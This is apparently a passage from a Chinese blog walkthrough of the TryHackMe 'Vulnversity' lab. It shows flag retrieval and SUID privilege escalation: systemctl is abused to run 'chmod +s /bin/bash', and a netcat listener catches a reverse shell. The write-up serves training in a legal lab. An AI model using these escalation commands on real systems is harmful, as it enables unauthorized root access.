+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找网站的管理员，看家目录用户即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">$ <span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">bill
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="what-is-the-user-flag">What is the user flag?</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">cd</span> bill
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl"><span class="nv">$cat</span> user.txt
+</span></span><span class="line"><span class="cl">8bd7992fbe8a6ad22a63361004cfcedb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>提权，利用SUID：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ find / -user root -perm -4000 -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">32944</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/newuidmap
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">49584</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/chfn
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">32944</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/newgidmap
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">136808</span> Jul  <span class="m">4</span>  <span class="m">2017</span> /usr/bin/sudo
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40432</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">54256</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/passwd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">23376</span> Jan <span class="m">15</span>  <span class="m">2019</span> /usr/bin/pkexec
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">39904</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/newgrp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">75304</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root <span class="m">98440</span> Jan <span class="m">29</span>  <span class="m">2019</span> /usr/lib/snapd/snap-confine
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">14864</span> Jan <span class="m">15</span>  <span class="m">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">428240</span> Jan <span class="m">31</span>  <span class="m">2019</span> /usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">10232</span> Mar <span class="m">27</span>  <span class="m">2017</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">76408</span> Jul <span class="m">17</span>  <span class="m">2019</span> /usr/lib/squid/pinger
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root messagebus <span class="m">42992</span> Jan <span class="m">12</span>  <span class="m">2017</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">38984</span> Jun <span class="m">14</span>  <span class="m">2017</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40128</span> May <span class="m">16</span>  <span class="m">2017</span> /bin/su
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">142032</span> Jan <span class="m">28</span>  <span class="m">2017</span> /bin/ntfs-3g
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40152</span> May <span class="m">16</span>  <span class="m">2018</span> /bin/mount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44680</span> May  <span class="m">7</span>  <span class="m">2014</span> /bin/ping6
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">27608</span> May <span class="m">16</span>  <span class="m">2018</span> /bin/umount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">659856</span> Feb <span class="m">13</span>  <span class="m">2019</span> /bin/systemctl
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44168</span> May  <span class="m">7</span>  <span class="m">2014</span> /bin/ping
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">30800</span> Jul <span class="m">12</span>  <span class="m">2016</span> /bin/fusermount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">35600</span> Mar  <span class="m">6</span>  <span class="m">2017</span> /sbin/mount.cifs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里使用systemctl，在GtfoBins找到需要执行的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">Type=oneshot
+</span></span></span><span class="line"><span class="cl"><span class="s1">ExecStart=/bin/sh -c &#34;id &gt; /tmp/output&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">[Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">./systemctl link <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">./systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依次输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">cd</span> bin
+</span></span><span class="line"><span class="cl">$ <span class="nv">TF1</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; Type=oneshot
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; [Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF1</span>
+</span></span><span class="line"><span class="cl">$ ./systemctl link <span class="nv">$TF1</span>
+</span></span><span class="line"><span class="cl">Created symlink from /etc/systemd/system/tmp.uQywY2kLc2.service to /tmp/tmp.uQywY2kLc2.service.
+</span></span><span class="line"><span class="cl">$ ./systemctl <span class="nb">enable</span> --now <span class="nv">$TF1</span>
+</span></span><span class="line"><span class="cl">Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.uQywY2kLc2.service to /tmp/tmp.uQywY2kLc2.service.
+</span></span><span class="line"><span class="cl">$ cat /tmp/output
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/nessus<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nc -lvvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.2.124.22<span class="o">]</span> from localhost <span class="o">[</span>10.10.189.32<span class="o">]</span> <span class="m">35874</span>
+</span></span><span class="line"><span class="cl">Linux vulnuniversity 4.4.0-142-generic <span class="c1">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 21:56:29 up  1:20,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="s1">&#39;t access tty; job control turned off
+</span></span></span><span class="line"><span class="cl"><span class="s1">$ TF1=$(mktemp).service
+</span></span></span><span class="line"><span class="cl"><span class="s1">$ echo &#39;</span><span class="o">[</span>Service<span class="o">]</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="nv">Type</span><span class="o">=</span>oneshot
+</span></span><span class="line"><span class="cl">&gt; <span class="nv">ExecStart</span><span class="o">=</span>/bin/sh -c <span class="s2">&#34;chmod +s /bin/bash&#34;</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="o">[</span>Install<span class="o">]</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="nv">WantedBy</span><span class="o">=</span>multi-user.target<span class="err">&#39;</span> &gt; <span class="nv">$TF1</span>
+</span></span><span class="line"><span class="cl">$ /bin/systemctl link <span class="nv">$TF1</span>
+</span></span><span class="line"><span class="cl">Created symlink from /etc/systemd/system/tmp.EKpuGvy4Ae.service to /tmp/tmp.EKpuGvy4Ae.service.
+</span></span><span class="line"><span class="cl">$ /bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TF1</span>
+</span></span><span class="line"><span class="cl">Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.EKpuGvy4Ae.service to /tmp/tmp.EKpuGvy4Ae.service.
+</span></span><span class="line"><span class="cl">$ /bin/bash -p
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">cat /root/root.txt
+</span></span><span class="line"><span class="cl">a58ff8579f0a9270368d33a9966c7fd5
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-01-02</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/thm-vulnversity/" data-title="TryHackMe -- Vulnversity" data-via="@YaoyaoShaw" data-hashtags="THM"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/thm-vulnversity/" data-hashtag="THM"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/thm-vulnversity/" data-title="TryHackMe -- Vulnversity"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/thm-vulnversity/" data-title="TryHackMe -- Vulnversity"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/thm-vulnversity/" data-title="TryHackMe -- Vulnversity"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/thm/">THM</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/01/thm-vulnerability_capstone/" class="prev" rel="prev" title="TryHackMe -- Vulnerability Caspstone"><i class="fas fa-angle-left fa-fw"></i>TryHackMe -- Vulnerability Caspstone</a>
+            <a href="/2024/01/cobalt_strike_basic_no.1/" class="next" rel="next" title="Cobalt Strike Basic No.1 -- Basic and Infrastructure Management">Cobalt Strike Basic No.1 -- Basic and Infrastructure Management<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
